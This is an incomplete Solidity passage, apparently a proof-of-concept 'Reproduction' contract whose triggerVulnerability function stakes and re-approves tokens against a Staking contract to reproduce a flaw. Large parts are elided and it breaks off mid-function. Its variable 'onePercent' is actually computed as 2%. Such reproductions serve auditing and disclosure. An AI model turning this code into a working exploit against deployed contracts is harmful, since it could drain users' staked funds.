...
contract Reproduction {
    ...
    constructor(address _sourceContract, address _tokenContract) {
    ...
    function triggerVulnerability() public {
        ...
        uint256 stakeTokens = 500 * 10 ** uint(10);
        uint256 onePercent = (stakeTokens * 200) / 10000;

        token.transferFrom(msg.sender, address(this), stakeTokens + onePercent);
        token.approve(sourceContract, stakeTokens + onePercent);

        Staking staking = Staking(sourceContract);
        staking.startStaking();

        token.transferFrom(msg.sender, address(this), stakeTokens);
        token.approve(sourceContract, stakeTokens);
